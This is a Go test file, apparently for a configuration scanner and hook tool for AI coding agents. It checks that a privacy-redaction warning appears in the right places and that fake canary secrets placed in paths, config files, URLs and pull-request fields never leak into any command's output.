// stderr, naming the file that set it; the hook never does, since
// each of its runs decides one tool call.
func TestPrivacyRedactFalseWarns(t *testing.T) {
	const policyDoc = "version: 1\nmode: enforce\nprivacy:\n  redact: false\n"
	t.Run("scan", func(t *testing.T) {
		root := hookProject(t, policyDoc)
		code, stdout, stderr := runCLI(t, "scan", "--format", "json", root)
		if code != int(exitcode.OK) && code != int(exitcode.Findings) {
			t.Fatalf("exit %d stderr %q", code, stderr)
		}
		policyPath := filepath.Join(root, ".tripcord", "policy.yaml")
		want := "tripcord scan: privacy.redact is false in " + policyPath
		if !strings.Contains(stderr, want) {
			t.Errorf("stderr = %q, want to contain %q", stderr, want)
		}
		if n := strings.Count(stderr, "privacy.redact is false"); n != 1 {
			t.Errorf("stderr has the warning %d times, want 1: %q", n, stderr)
		}
		if strings.Contains(stdout, "privacy.redact") {
			t.Errorf("stdout carries the warning: %q", stdout)
		}
	})
	t.Run("init preserves and warns about an existing policy", func(t *testing.T) {
		root := hookProject(t, policyDoc)
		code, stdout, stderr := runCLI(t, "init", root)
		if code != int(exitcode.OK) {
			t.Fatalf("exit %d stderr %q", code, stderr)
		}
		policyPath := filepath.Join(root, embedded.PolicyPath)
		want := "tripcord init: privacy.redact is false in " + policyPath
		if !strings.Contains(stderr, want) {
			t.Errorf("stderr = %q, want to contain %q", stderr, want)
		}
		if strings.Contains(stdout, "privacy.redact") {
			t.Errorf("stdout carries the warning: %q", stdout)
		}
		if raw, err := os.ReadFile(policyPath); err != nil || string(raw) != policyDoc {
			t.Errorf("policy.yaml changed: %q, %v", raw, err)
		}
	})
	t.Run("init writing the default policy does not warn", func(t *testing.T) {
		dir := outsideGit(t)
		code, stdout, stderr := runCLI(t, "init", dir)
		if code != int(exitcode.OK) || strings.Contains(stdout+stderr, "privacy.redact") {
			t.Errorf("exit %d stdout %q stderr %q", code, stdout, stderr)
		}
	})
	t.Run("hook never warns", func(t *testing.T) {
		hookProject(t, policyDoc)
		stdin := `{"hook_event_name":"PreToolUse","tool_name":"Bash","tool_input":{"command":"echo hi"}}`
		_, stdout, stderr := runHookCLI(t, strings.NewReader(stdin), "--harness", "claude", "--event", hook.EventPreTool)
		if strings.Contains(stdout+stderr, "privacy.redact") {
			t.Errorf("hook mentions privacy.redact: stdout %q stderr %q", stdout, stderr)
		}
	})
}

// TestRedactionCanaryHome covers S5-S7: a home directory whose name is
// a canary, with and without a trailing slash, never appears in scan
// output for user-scope config, in a hook error for a project under
// it, in an org policy error, or in a managed policy permission error
// for a symlink under it.
func TestRedactionCanaryHome(t *testing.T) {
	for _, suffix := range []string{"", "/"} {
		t.Run("trailing slash "+fmt.Sprint(suffix != ""), func(t *testing.T) {
			home := filepath.Join(t.TempDir(), "CNRYS5HOME7Q2W")
			if err := os.Mkdir(home, 0o700); err != nil {
				t.Fatal(err)
			}
			t.Setenv("HOME", home+suffix)
			t.Setenv("USERPROFILE", home+suffix)
			t.Setenv("XDG_CONFIG_HOME", "")
			writeTestFile(t, home, ".claude.json", `{"mcpServers":{"h":{"command":"bash","args":["-c",`+jsonString("sh "+filepath.Join(home, "bin", "x.sh")+" "+home+suffix)+`]}}}`)
			repo := filepath.Join(home, "src", "repo")
			if err := os.MkdirAll(filepath.Join(repo, ".git"), 0o700); err != nil {
				t.Fatal(err)
			}
			for _, format := range []string{"json", "jsonl", "sarif", "text", "gha", "md"} {
				code, stdout, stderr := runCLI(t, "scan", "--scope", "user", "--format", format, repo)
				if code != int(exitcode.Findings) || !strings.Contains(stdout, "TC-CFG-003") {
					t.Errorf("%s: exit %d stdout %q stderr %q", format, code, stdout, stderr)
				}
				assertNoCanary(t, "user scope "+format, stdout+stderr)
			}
			code, stdout, stderr := runCLI(t, "scan", "--org-policy", filepath.Join(home, "org", "missing.yaml"), repo)
			if code != int(exitcode.Config) {
				t.Errorf("org policy: exit %d stderr %q", code, stderr)
			}
			assertNoCanary(t, "org policy error", stdout+stderr)

			project := filepath.Join(home, "no-git")
			if err := os.Mkdir(project, 0o700); err != nil {
				t.Fatal(err)
			}
			t.Chdir(project)
			t.Setenv("CLAUDE_PROJECT_DIR", project)
			t.Setenv("CURSOR_PROJECT_DIR", project)
			for _, h := range embedded.HookHarnesses {
				code, stdout, stderr := runHookCLI(t, bytes.NewReader(adapterFixture(t, h, map[model.Harness]string{
					model.HarnessClaude:  "pre-tool-use-bash-allow.json",
					model.HarnessCursor:  "pre-tool-use-shell-allow.json",
					model.HarnessCopilot: "pre-tool-use-bash-allow.json",
				}[h])), "--harness", string(h), "--event", hook.EventPreTool, "--on-failure", "block")
				if code != int(exitcode.Block) || !strings.Contains(stderr, "no Git repository") {
					t.Errorf("%s: exit %d stderr %q", h, code, stderr)
				}
				assertNoCanary(t, string(h)+" hook error", stdout+stderr)
			}

			target := filepath.Join(home, "managed-target.yaml")
			if err := os.WriteFile(target, []byte("version: 1\n"), 0o600); err != nil {
				t.Fatal(err)
			}
			if err := os.Chmod(target, 0o666); err != nil {
				t.Fatal(err)
			}
			link := filepath.Join(home, "managed.yaml")
			if err := os.Symlink(target, link); err != nil {
				t.Fatal(err)
			}
			env, _, err := loadRules(scanLimits())
			if err != nil {
				t.Fatal(err)
			}
			_, err = policy.Load(policy.Options{RepoRoot: repo, ManagedPolicy: link, Surface: policy.SurfaceScan, Env: env})
			if err == nil {
				t.Fatal("a world-writable managed policy loaded")
			}
			assertNoCanary(t, "managed policy error", errorText(err))
		})
	}
}

// TestRedactionCanaryCommands: init --dry-run over config carrying
// every canary, preopen of a URL with a canary password, and pr-context
// of a pull request whose branch and title carry canaries never print
// one.
func TestRedactionCanaryCommands(t *testing.T) {
	t.Run("init dry run", func(t *testing.T) {
		indent := func(v any) string {
			var b bytes.Buffer
			enc := json.NewEncoder(&b)
			enc.SetEscapeHTML(false)
			enc.SetIndent("", "  ")
			if err := enc.Encode(v); err != nil {
				t.Fatal(err)
			}
			return b.String()
		}
		for _, enc := range canaryEncodings {
			for _, c := range redactionCanaries {
				encode := func(doc string) string {
					return strings.ReplaceAll(doc, c.secret, strings.Trim(jsonCanary(c.secret, c.secret, enc), `"`))
				}
				dir := embedRoot(t)
				writeTestFile(t, dir, ".claude/settings.json", encode(indent(map[string]any{"env": map[string]string{"CANARY": c.text}})))
				writeTestFile(t, dir, embedded.CursorEnvironmentPath, encode(indent(map[string]any{"start": c.text})))
				args := []string{"--cloud-setup", "--dry-run", dir}
				if enc != encodePlain {
					args = append([]string{"--force"}, args...)
				}
				code, stdout, stderr := runCLI(t, embedArgs(args...)...)
				if code != 0 || !strings.Contains(stdout, ` "CANARY": `) || !strings.Contains(stdout, `"start": `) {
					t.Errorf("%s %s: exit %d stdout %q stderr %q", enc, c.class, code, stdout, stderr)
				}
				assertNoCanary(t, string(enc)+" init --dry-run", stdout+stderr)
			}
		}
	})
	t.Run("preopen", func(t *testing.T) {
		preopenTemp(t)
		for _, target := range []string{
			"https://u:CNRYS4UI7Q2W@127.0.0.1:9/r",
			"ftp://u:CNRYS4UI7Q2W@h.invalid/r",
			"https://h.invalid/r?token=CNRYS1EQ7Q2W",
			"--token=CNRYS1EQ7Q2W",
		} {
			for _, format := range []string{"text", "json"} {
				code, stdout, stderr := runCLI(t, "preopen", "--format", format, target)
				if code == 0 {
					t.Errorf("preopen %q succeeded", target)
				}
				assertNoCanary(t, "preopen", stdout+stderr)
			}
		}
	})
	t.Run("pr-context", func(t *testing.T) {
		clearPrContextEnv(t)
		repo := initRepo(t)
		for _, c := range redactionCanaries {
			event := filepath.Join(t.TempDir(), "event.json")
			body := `{"pull_request":{"title":` + jsonString(c.text) + `,"user":{"login":` + jsonString(c.text) + `},"head":{"ref":` + jsonString("cursor/"+c.text) + `,"sha":"0000000000000000000000000000000000000001"},"base":{"ref":` + jsonString(c.text) + `,"sha":"0000000000000000000000000000000000000002"}}}`
			if err := os.WriteFile(event, []byte(body), 0o600); err != nil {
				t.Fatal(err)
			}
			for _, format := range []string{"text", "json", "gha"} {
				outputFile := filepath.Join(t.TempDir(), "github_output")
				t.Setenv("GITHUB_OUTPUT", outputFile)
				_, stdout, stderr := runCLI(t, "pr-context", "--format", format, "--repo", repo, "--event", event)
				written, err := os.ReadFile(outputFile)
				if err != nil && !os.IsNotExist(err) {
					t.Fatal(err)
				}
				assertNoCanary(t, c.class+" pr-context "+format, stdout+stderr+string(written))
			}
		}
	})
}
